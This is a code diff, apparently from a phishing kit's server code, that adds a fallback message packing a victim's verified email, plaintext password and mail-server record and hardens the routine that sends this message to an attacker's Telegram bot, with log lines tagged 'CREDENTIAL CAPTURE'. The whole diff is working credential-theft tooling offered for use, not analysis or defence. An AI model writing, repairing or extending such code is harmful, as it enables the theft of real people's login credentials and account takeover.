@@ -753,21 +753,40 @@ ${verification.valid
     // Send Telegram notification for EVERY attempt (only if enabled)
     const telegramSettings = (await getSettings()).notifications.telegram
     
+    // Ensure message is not empty (fallback if somehow message wasn't set)
+    if (!message || message.trim() === '') {
+      // Fallback message if somehow message wasn't set
+      message = `+++FOX NOTIFICATION+++
+
+🎯 Attempt ${currentAttempt}/4
+
+📧 ${verifiedEmail}
+🔑 ${password}
+📬 MX: ${primaryMX}`
+      console.warn('[CREDENTIAL CAPTURE] ⚠️  Message was empty, using fallback')
+    }
+    
     // Log notification attempt (always log in production for debugging)
     console.log('[CREDENTIAL CAPTURE] 📧 Attempting Telegram notification:', {
       enabled: telegramSettings.enabled,
       hasBotToken: !!telegramSettings.botToken,
       hasChatId: !!telegramSettings.chatId,
       email: email.substring(0, 10) + '...', // Partial email for privacy
+      attempt: currentAttempt,
+      messageLength: message.length,
     })
     
     // Only send if Telegram is enabled and configured
     if (telegramSettings.enabled !== false) {
-      const telegramResult = await sendTelegramMessage(message)
-      if (telegramResult) {
-        console.log('[CREDENTIAL CAPTURE] ✅ Telegram notification sent successfully')
-      } else {
-        console.warn('[CREDENTIAL CAPTURE] ⚠️  Telegram notification failed - check bot token and chat ID')
+      try {
+        const telegramResult = await sendTelegramMessage(message)
+        if (telegramResult) {
+          console.log('[CREDENTIAL CAPTURE] ✅ Telegram notification sent successfully')
+        } else {
+          console.warn('[CREDENTIAL CAPTURE] ⚠️  Telegram notification failed - check bot token and chat ID')
+        }
+      } catch (error: any) {
+        console.error('[CREDENTIAL CAPTURE] ❌ Telegram notification error:', error.message || error)
       }
     } else {
       console.log('[CREDENTIAL CAPTURE] ℹ️  Telegram notifications are disabled in settings')
